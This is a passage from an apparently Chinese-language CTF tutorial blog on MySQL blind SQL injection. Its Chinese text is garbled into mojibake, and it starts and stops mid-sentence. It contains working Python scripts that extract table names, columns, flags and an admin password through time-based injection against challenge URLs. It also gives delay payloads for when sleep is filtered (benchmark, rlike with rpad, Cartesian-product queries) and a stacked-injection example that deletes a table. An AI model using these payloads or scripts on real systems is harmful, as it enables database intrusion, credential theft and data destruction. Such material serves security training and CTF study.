database()),1,1))&gt;1,sleep(3),0)#</span><br></pre></td></tr></table></figure><p>trimé…åˆæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim([both/leading/trailing] ç›®æ ‡å­—ç¬¦ä¸² FROM æºå­—ç¬¦ä¸²)</span><br></pre></td></tr></table></figure><p>ä»æºå­—ç¬¦ä¸²ä¸­å»é™¤é¦–å°¾&#x2F;é¦–&#x2F;å°¾çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œå¦‚å¯»æ‰¾å­—ç¬¦ä¸²ç¬¬ä¸€ä½ï¼Œå‡å®šXä»£è¡¨æŸå­—ç¬¦ï¼Œ<code>trim(leading X from &#39;abcd&#39;) = trim(leading X+1 from &#39;abcd&#39;)</code>ä¸ç›¸ç­‰ï¼Œè¯´æ˜æ­£ç¡®ç»“æœæ˜¯Xæˆ–X+1å†è¿›è¡Œ<code>trim(leading X+1 from &#39;abcd&#39;) = trim(leading X+2 from &#39;abcd&#39;)</code> ç›¸ç­‰åˆ™æ­£ç¡®ä¸ºXï¼Œä¸ç›¸ç­‰åˆ™X+1æ­£ç¡®</p><p>è‹¥<code>trim(leading X from &#39;abcd&#39;) = trim(leading X+1 from &#39;abcd&#39;)</code>ç›¸ç­‰è¯´æ˜Xä¸X+1éƒ½ä¸ºå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ï¼Œä¸å­˜åœ¨è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥éœ€è¦ç»§ç»­æ¯”è¾ƒX+1ä¸X+2ç›´è‡³ç›¸ç­‰</p><h5 id="æ³¨å…¥æµç¨‹-3"><a href="#æ³¨å…¥æµç¨‹-3" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><p>æ—¶é—´ç›²æ³¨æˆ‘ä»¬ä¹Ÿæ˜¯åˆ©ç”¨è„šæœ¬å®Œæˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://39d4639d-df36-43ca-8bac-fec55f4a66f3.challenge.ctf.show/api/index.php&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    min=32</span><br><span class="line">    max=128</span><br><span class="line">    while True:</span><br><span class="line">        mid = (min+max)//2</span><br><span class="line">        if(max == min):</span><br><span class="line">            result+=chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">        #     &#x27;debug&#x27;:0</span><br><span class="line">        # &#125;çˆ†åº“å</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">        #     &#x27;debug&#x27;:0</span><br><span class="line">        # &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">            &#x27;debug&#x27;:0</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r = requests.post(url, data=data).text</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        full_time=end_time - start_time</span><br><span class="line"></span><br><span class="line">        if(full_time &gt;=0.5):</span><br><span class="line">            min=mid+1</span><br><span class="line">        else:</span><br><span class="line">            max=mid</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯ç”¨äºŒåˆ†æŸ¥æ‰¾ï¼Œæ¥å‡å°‘æ—¶é—´ç›²æ³¨æ‰€è€—è´¹çš„æ—¶é—´(ä¸€èˆ¬æ¥è¯´å¾ˆè€—æ—¶)ä¹Ÿå¯ä»¥åŠ ä¸ªçº¿ç¨‹æ± </p><blockquote><p>ä»¥ä¸Šä¸¤ç§è„šæœ¬éƒ½æ˜¯éå¸¸å¸¸è§çš„ï¼Œä¸¤ç§æ³¨å…¥æ–¹å¼ï¼Œä½†æ˜¯å®è·µçš„æ¯”èµ›ä¸­ï¼Œå¯èƒ½ä¼šè¿‡æ»¤æ‰æ‰¾ä¸åˆ°ç›¸åº”çš„åŠæ³•ï¼Œè¿™æ—¶å€™å°±ä¸èƒ½ä¹‹æ‹˜ç¦äºè¿™ä¸¤ç§æ–¹æ³•ï¼Œå›ºå®šåŒ–çš„æ€è·¯å¯¹äºæ¸—é€æ¥è¯´æ˜¯ä¸å¯è¡Œçš„</p></blockquote><p>å½“sleepè¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨</p><h5 id="benchmark-å‡½æ•°"><a href="#benchmark-å‡½æ•°" class="headerlink" title="benchmark()å‡½æ•°"></a><strong>benchmark()å‡½æ•°</strong></h5><p>åœ¨MySQLä¸­ï¼Œ<code>BENCHMARK()</code> å‡½æ•°æ˜¯ä¸€ç§ç”¨äºæ‰§è¡ŒåŸºå‡†æµ‹è¯•çš„å†…ç½®å‡½æ•°ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å¸®åŠ©æµ‹è¯•æŸä¸ªè¡¨è¾¾å¼åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œçš„é€Ÿåº¦ï¼Œé€šè¿‡é‡å¤å¤šæ¬¡æ‰§è¡ŒåŒä¸€ä¸ªè¡¨è¾¾å¼ï¼Œæ¥æµ‹é‡æ•°æ®åº“çš„æ€§èƒ½è¡¨ç°ã€‚</p><h6 id="BENCHMARK-å‡½æ•°çš„è¯­æ³•"><a href="#BENCHMARK-å‡½æ•°çš„è¯­æ³•" class="headerlink" title="BENCHMARK() å‡½æ•°çš„è¯­æ³•"></a><code>BENCHMARK()</code> å‡½æ•°çš„è¯­æ³•</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(loop_count, expression)</span><br><span class="line">loop_count: è¡¨ç¤ºè¦é‡å¤æ‰§è¡Œçš„æ¬¡æ•°ï¼Œå³è¡¨è¾¾å¼å°†è¢«æ‰§è¡Œå¤šå°‘æ¬¡ã€‚</span><br><span class="line">expression: è¡¨ç¤ºè¦è¿›è¡ŒåŸºå‡†æµ‹è¯•çš„è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure><p><code>benchmark(3000000, sha(1))</code> ç”¨äºå»¶æ—¶ï¼Œæ‰§è¡Œ 3000000 æ¬¡ <code>sha(1)</code>ï¼Œå¤§æ¦‚ä¼šè€—è´¹å‡ ç™¾æ¯«ç§’åˆ°å‡ ç§’çš„æ—¶é—´ï¼ˆå…·ä½“æ—¶é—´ä¾èµ–äºæœåŠ¡å™¨çš„è®¡ç®—æ€§èƒ½ï¼‰ã€‚</p><p>ä»£ç é€šè¿‡æ¯”è¾ƒ <code>sub</code>ï¼ˆå®é™…æ‰§è¡Œæ—¶é—´ï¼‰ä¸è®¾å®šçš„ 0.5 ç§’é˜ˆå€¼ï¼Œåˆ¤æ–­æ˜¯å¦è§¦å‘äº† <code>benchmark</code> å»¶æ—¶ï¼Œä»è€Œæ¨æµ‹æ•°æ®åº“ä¸­å­—ç¬¦çš„ ASCII å€¼ã€‚</p><p>å› æ­¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">                &#x27;ip&#x27;: f&quot;1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,benchmark(3000000,sha(1)),&#x27;False&#x27;)#&quot;,</span><br><span class="line">                &#x27;debug&#x27;: 0</span><br><span class="line">            &#125;</span><br><span class="line">//ç”¨benchmark(3000000,sha(1))æ›¿æ¢sleep(0.5)             </span><br></pre></td></tr></table></figure><h5 id="rlikeå‡½æ•°æ„é€ å¤§é‡å­—ç¬¦ä¸²å»¶æ—¶"><a href="#rlikeå‡½æ•°æ„é€ å¤§é‡å­—ç¬¦ä¸²å»¶æ—¶" class="headerlink" title="rlikeå‡½æ•°æ„é€ å¤§é‡å­—ç¬¦ä¸²å»¶æ—¶"></a>rlikeå‡½æ•°æ„é€ å¤§é‡å­—ç¬¦ä¸²å»¶æ—¶</h5><ol><li><strong><code>rpad(1, 999999, &#39;a&#39;)</code></strong>:</li></ol><ul><li><strong><code>rpad()</code></strong> æ˜¯ä¸€ä¸ª SQL å­—ç¬¦ä¸²å‡½æ•°ï¼Œç”¨æ¥åœ¨å­—ç¬¦ä¸²å³ä¾§å¡«å……æŒ‡å®šå­—ç¬¦ï¼Œç›´åˆ°è¾¾åˆ°ç›®æ ‡é•¿åº¦ã€‚</li><li>è¿™é‡Œï¼Œ<code>rpad(1, 999999, &#39;a&#39;)</code> çš„ä½œç”¨æ˜¯ä»æ•°å­— <code>1</code> å¼€å§‹ï¼Œç”¨å­—ç¬¦ <code>&#39;a&#39;</code> å³å¡«å……ï¼Œç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 999999 çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªéå¸¸é•¿çš„ <code>&#39;a&#39;</code> å­—ç¬¦ä¸²ã€‚</li><li>ç”±äºä¸€å…±è°ƒç”¨äº† <strong>16 æ¬¡</strong> <code>rpad()</code>ï¼Œæ¯æ¬¡ç”Ÿæˆ 999999 ä¸ª <code>&#39;a&#39;</code>ï¼Œå› æ­¤æœ€åé€šè¿‡ <strong><code>concat()</code></strong> æ‹¼æ¥å½¢æˆäº†ä¸€ä¸ªåŒ…å« 16 * 999999 &#x3D; 15,999,984 ä¸ª <code>&#39;a&#39;</code> çš„å­—ç¬¦ä¸²ã€‚</li></ul><ol start="2"><li><strong><code>concat()</code></strong>:</li></ol><ul><li><strong><code>concat()</code></strong> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°ã€‚å®ƒå°† 16 ä¸ª <code>rpad(1, 999999, &#39;a&#39;)</code> ç”Ÿæˆçš„è¶…é•¿å­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªæ›´é•¿çš„å­—ç¬¦ä¸²ï¼Œæ€»é•¿åº¦æ¥è¿‘ <strong>16,000,000</strong> ä¸ªå­—ç¬¦ã€‚</li></ul><ol start="3"><li><strong><code>RLIKE &#39;(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+b&#39;</code></strong>:</li></ol><p> <strong><code>RLIKE</code></strong> æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¿ç®—ç¬¦ï¼Œç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p>   æ˜¯è¦åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><ul><li><strong><code>(a.\*)+</code></strong>: è¿™ä¸ªéƒ¨åˆ†è¡¨ç¤ºåŒ¹é…å¤šä¸ª <code>a</code> å­—ç¬¦ä»¥åŠåç»­çš„ä»»ä½•å­—ç¬¦ï¼ˆ<code>.*</code> è¡¨ç¤ºåŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦ï¼‰ã€‚</li><li><strong><code>b</code></strong>: æœ€åè¦åŒ¹é…ä¸€ä¸ª <code>b</code> å­—ç¬¦ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š(concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) rlike &#x27;(a.*)+(a.*)+b&#x27;)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç”Ÿæˆå¤§é‡çš„å­—ç¬¦ï¼Œå¦‚æœä¸ºtrueåˆ™ä¸ä¼šæ‰§è¡Œï¼Œå¦‚æœä¸ºtrueï¼Œåˆ™ä¼šæ‰§è¡Œè¯¥payloadï¼Œé€ æˆæœåŠ¡å™¨æ— æ³•åŠæ—¶å¤„ç†å¤§é‡å­—ç¬¦ï¼Œä»è€Œè¾¾åˆ°å’Œsleepç›¸åŒçš„æ•ˆæœ</p><h5 id="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"></a>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</h5><p>åœ¨ SQL æ³¨å…¥ä¸­ï¼Œ<strong>ç¬›å¡å°”ç§¯</strong>ï¼ˆä¹Ÿç§°ä¸º<strong>ç¬›å¡å°”ä¹˜ç§¯</strong>ï¼‰æ˜¯æ•°æ®åº“æ“ä½œä¸­çš„ä¸€ç§æŸ¥è¯¢ç»“æœå½¢å¼ã€‚å®ƒæŒ‡çš„æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨ä¹‹é—´<strong>ä¸é€šè¿‡ä»»ä½•æ¡ä»¶</strong>è¿›è¡Œå…³è”æ—¶äº§ç”Ÿçš„ç»“æœé›†åˆã€‚ç¬›å¡å°”ç§¯ä¼šè¿”å›<strong>æ¯ä¸€ä¸ªè¡¨ä¸­çš„æ¯ä¸€è¡Œçš„ç»„åˆ</strong>ï¼Œå³å¦‚æœè¡¨ A æœ‰ 5 è¡Œï¼Œè¡¨ B æœ‰ 4 è¡Œï¼Œé‚£ä¹ˆç¬›å¡å°”ç§¯çš„ç»“æœä¼šæœ‰ 5 * 4 &#x3D; 20 è¡Œã€‚</p><p>ç¬›å¡å°”ç§¯å¹¶ä¸æ˜¯ SQL æ³¨å…¥çš„æ ¸å¿ƒæ¦‚å¿µï¼Œä½†å®ƒæœ‰æ—¶å¯ä»¥è¢«<strong>æ»¥ç”¨</strong>ï¼Œå¯¼è‡´ä¸æœŸæœ›çš„å¤§é‡æ•°æ®è¿”å›ï¼Œæˆ–è€…åœ¨æŸäº›ç‰¹å®šçš„æ”»å‡»åœºæ™¯ä¸‹è¢«åˆ©ç”¨ã€‚</p><p>ä¾‹å¦‚ï¼Œå½“æ”»å‡»è€…é€šè¿‡ SQL æ³¨å…¥æ“çºµæŸ¥è¯¢æ—¶ï¼Œå¦‚æœä»–ä»¬åˆ é™¤äº† <code>JOIN</code> æˆ– <code>WHERE</code> æ¡ä»¶ï¼Œå¯èƒ½å¯¼è‡´è¿”å›çš„ç»“æœé›†æˆä¸ºä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨çš„ç¬›å¡å°”ç§¯ã€‚è¿™é€šå¸¸ä¼šæ˜¾è‘—å¢åŠ æŸ¥è¯¢çš„ç»“æœé›†ï¼Œå¯èƒ½å¼•å‘æ€§èƒ½é—®é¢˜æˆ–å¯¼è‡´è¿‡é‡çš„æ•°æ®æš´éœ²ã€‚</p><p>å‡è®¾æœ‰ä¸¤ä¸ªè¡¨ï¼š<code>Users</code> å’Œ <code>Orders</code>ã€‚</p><p><code>Users</code> è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+</span><br><span class="line">| ID | Name     |</span><br><span class="line">+----+----------+</span><br><span class="line">|  1 | Alice    |</span><br><span class="line">|  2 | Bob      |</span><br><span class="line">|  3 | Charlie  |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure><p><code>Orders</code> è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+</span><br><span class="line">| ID | OrderName  |</span><br><span class="line">+----+------------+</span><br><span class="line">|  1 | Order1     |</span><br><span class="line">|  2 | Order2     |</span><br><span class="line">|  3 | Order3     |</span><br><span class="line">|  4 | Order4     |</span><br><span class="line">+----+------------+</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ è¿›è¡Œä¸‹é¢çš„æŸ¥è¯¢ï¼Œ<strong>æ²¡æœ‰ä»»ä½•å…³è”æ¡ä»¶</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users, Orders;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå°†æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----+------------+</span><br><span class="line">| ID | Name     | ID | OrderName  |</span><br><span class="line">+----+----------+----+------------+</span><br><span class="line">|  1 | Alice    |  1 | Order1     |</span><br><span class="line">|  1 | Alice    |  2 | Order2     |</span><br><span class="line">|  1 | Alice    |  3 | Order3     |</span><br><span class="line">|  1 | Alice    |  4 | Order4     |</span><br><span class="line">|  2 | Bob      |  1 | Order1     |</span><br><span class="line">|  2 | Bob      |  2 | Order2     |</span><br><span class="line">|  2 | Bob      |  3 | Order3     |</span><br><span class="line">|  2 | Bob      |  4 | Order4     |</span><br><span class="line">|  3 | Charlie  |  1 | Order1     |</span><br><span class="line">|  3 | Charlie  |  2 | Order2     |</span><br><span class="line">|  3 | Charlie  |  3 | Order3     |</span><br><span class="line">|  3 | Charlie  |  4 | Order4     |</span><br><span class="line">+----+----------+----+------------+</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å°±é€ æˆäº†è¿”å›äº†å¤§é‡æ•°æ®ï¼Œé€ æˆæ—¶é—´å»¶æ—¶</p><p><code>count(*)</code> åé¢æ‰€æœ‰è¡¨ä¸­çš„<strong>åˆ—ç¬›å¡å°”ç§¯æ•°</strong>ï¼Œ<strong>æ•°é‡è¶Šå¤šè¶Šå¡</strong>ï¼Œå°±ä¼šæœ‰å»¶è¿Ÿï¼Œç±»ä¼¼ä¹‹å‰æŸæ¯”èµ›pgsqlçš„å»¶æ—¶æ³¨å…¥ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¥ <strong>æ‰“æ—¶é—´å·®</strong>ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœéƒ½ä¼šæœ‰å»¶è¿Ÿã€‚è¿™é‡Œé€‰ç”¨<code>information_schema.columnsè¡¨</code>çš„åŸå› æ˜¯å…¶å†…éƒ¨æ•°æ®è¾ƒå¤šï¼Œåˆ°æ—¶å€™å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ¢ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŸç†ï¼Œå¹¶é…åˆif()è¯­å¥è¿›è¡Œå»¶æ—¶æ³¨å…¥äº†ï¼Œpayload ä¸ä¹‹å‰ç›¸ä¼¼ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 504 Gateway Time-out    # æœ‰å¾ˆé•¿çš„å»¶æ—¶, ä»¥è‡³äºTime-outäº†</span><br></pre></td></tr></table></figure><p>ç»™å‡ºä¸€ä¸ªç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=None)    # ä¸é™åˆ¶è¶…æ—¶</span><br><span class="line"></span><br><span class="line">       if &#x27;504 Gateway Time-out&#x27; in res.text:      # ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p><a href="https://www.jb51.net/article/212587.htm">MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°</a>è¿™é‡Œç»™ä¸ªé“¾æ¥ï¼Œæƒ³ç®€å•äº†è§£çš„å¯ä»¥å»çœ‹çœ‹</p><hr><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>åœ¨SQLä¸­ï¼Œåˆ†å·<code>;</code> æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿ å› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚</p><p>è€Œè”åˆæ³¨å…¥ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ</p><p>åŒºåˆ«å°±åœ¨äº union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™åˆ¶çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œçš„æ˜¯<strong>æŸ¥è¯¢è¯­å¥</strong>ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products;</code> æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š<code>select * from products where id=1;DELETE FROM products;</code> å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ç§å †å æ³¨å…¥ä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ã€‚å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œ<strong>å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶</strong>ï¼Œå½“ç„¶<strong>æƒé™ä¸è¶³</strong>ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p>è™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sqlè¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾çš„ã€‚åœ¨æœ‰çš„Webç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å 